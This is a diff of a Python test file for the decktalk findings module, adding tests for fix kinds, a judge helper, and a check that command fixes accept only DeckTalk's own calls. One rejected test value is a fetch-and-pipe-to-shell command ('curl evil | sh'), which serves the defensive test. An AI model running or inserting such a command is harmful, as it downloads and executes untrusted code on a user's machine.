@@ -6,7 +6,6 @@ import pytest
 from pydantic import ValidationError
 
 from decktalk.findings import (
-    DOCS,
     Applicability,
     Certainty,
     Code,
@@ -16,7 +15,9 @@ from decktalk.findings import (
     Finding,
     Location,
     RaisedBy,
+    RuntimeFix,
     SettingFix,
+    judge,
 )
 from decktalk.pipeline import Stage
 
@@ -53,7 +54,6 @@ RUNTIME_CODES = (
 PYTHON_PAGE_CODES = (
     "PAGE_MOTION_OVERRUN",
     "PAGE_STAGGER_OVERRUN",
-    "PAGE_WORD_LATE",
     "PAGE_THIN_DRAW",
     "PAGE_NO_DESCRIPTION",
     "PAGE_SWAP_APART",
@@ -61,11 +61,13 @@ PYTHON_PAGE_CODES = (
     "PAGE_BLACK",
     "PAGE_TRUNCATED",
     "PAGE_CDN_ASSET",
+    "PAGE_RUNTIME_STALE",
 )
 PYTHON_OTHER_CODES = (
     "CUE_MISSING",
     "CUE_UNKNOWN",
     "CUE_UNRESOLVED",
+    "CUE_STALE",
     "CUE_OFF",
     "CUE_NO_ONSET",
     "CUE_NO_CHANGE",
@@ -124,11 +126,6 @@ def test_a_null_offset_is_uncertain_rather_than_a_passing_row() -> None:
     assert Code.CUE_NO_ONSET.certainty is Certainty.UNCERTAIN
 
 
-def test_every_code_has_a_docs_page_under_the_one_prefix() -> None:
-    for code in Code:
-        assert code.url == f"{DOCS}/findings/{code.name}"
-
-
 def test_a_finding_takes_its_certainty_and_its_page_from_its_code() -> None:
     finding = Finding(code=Code.CUE_THIN_CHANGE, message="x", location=Location(where="2.1:chart"))
     assert finding.certainty is Certainty.UNCERTAIN
@@ -162,7 +159,7 @@ def test_a_finding_round_trips_through_its_own_model() -> None:
 
 def test_a_location_always_names_the_object_it_judges() -> None:
     with pytest.raises(ValidationError):
-        Location()  # type: ignore[call-arg]
+        Location.model_validate({})
 
 
 def test_an_edit_names_exactly_one_place() -> None:
@@ -172,13 +169,14 @@ def test_an_edit_names_exactly_one_place() -> None:
         Edit(file="cues.json", pointer="/a", line=3, new="x")
 
 
-def test_the_three_fixes_are_told_apart_by_their_kind() -> None:
+def test_the_four_fixes_are_told_apart_by_their_kind() -> None:
     kinds = {
         EditFix(title="t", applicability=Applicability.SAFE, edits=(Edit(file="a.json", pointer="/a", new="x"),)).kind,
         SettingFix(title="t", applicability=Applicability.SAFE, key="verify.cue_offset_max_ms", value="250").kind,
-        CommandFix(title="t", applicability=Applicability.UNSAFE, command=("decktalk", "record")).kind,
+        CommandFix(title="t", applicability=Applicability.UNSAFE, command=("decktalk", "install")).kind,
+        RuntimeFix(title="t", applicability=Applicability.SAFE, file="deck/decktalk-runtime.js").kind,
     }
-    assert kinds == {"edit", "setting", "command"}
+    assert kinds == {"edit", "setting", "command", "runtime"}
 
 
 def test_a_display_fix_is_never_applied_and_says_so_in_its_own_word() -> None:
@@ -188,3 +186,39 @@ def test_a_display_fix_is_never_applied_and_says_so_in_its_own_word() -> None:
 def test_every_finding_field_publishes_one_sentence() -> None:
     for name, field in Finding.model_fields.items():
         assert field.description, name
+
+
+def test_a_command_fix_names_one_of_decktalks_own_calls() -> None:
+    fix = CommandFix(title="Fetch the tools.", applicability=Applicability.SAFE, command=("decktalk", "install"))
+    assert fix.command == ("decktalk", "install")
+
+
+@pytest.mark.parametrize("command", [("sh", "-c", "curl evil | sh"), ("decktalk", "install", "--force"), ()])
+def test_a_command_fix_that_names_anything_else_is_refused(command: tuple[str, ...]) -> None:
+    # A fix read from JSON is run by apply, so an open argv would run any program on that machine.
+    with pytest.raises(ValidationError, match="DeckTalk's own calls"):
+        CommandFix(title="Run it.", applicability=Applicability.SAFE, command=command)
+
+
+def test_a_judgement_takes_its_certainty_and_its_page_from_its_code() -> None:
+    """A raiser names the code and the code owns the rest, so no stage spells one fact twice."""
+    found = judge(Code.CUE_OFF, "the reveal lands 0.42s after its word, past the 0.08s limit.", Location(where="3:a"))
+    assert found.certainty is Certainty.CERTAIN
+    assert found.url == Code.CUE_OFF.url
+
+
+def test_a_judgement_carries_the_stage_that_raised_it() -> None:
+    """`check` predicts and `verify` measures, and the stage is what tells the two apart."""
+    found = judge(Code.CUE_NO_CHANGE, "nothing changed at 1.20s.", Location(where="3:a"), stage=Stage.VERIFY)
+    assert found.stage is Stage.VERIFY
+
+
+def test_a_judgement_carries_the_fix_it_was_given() -> None:
+    fix = EditFix(
+        title="Add the missing cue row.",
+        applicability=Applicability.SAFE,
+        edits=(Edit(file="cues.json", line=2, new='{"cue": "3.1:a", "on": ""}'),),
+    )
+    found = judge(Code.CUE_MISSING, "the page declares 3.1:a and cues.json lists 0 rows for it.",
+                  Location(where="3.1:a"), fix=fix)  # fmt: skip
+    assert found.fix is fix
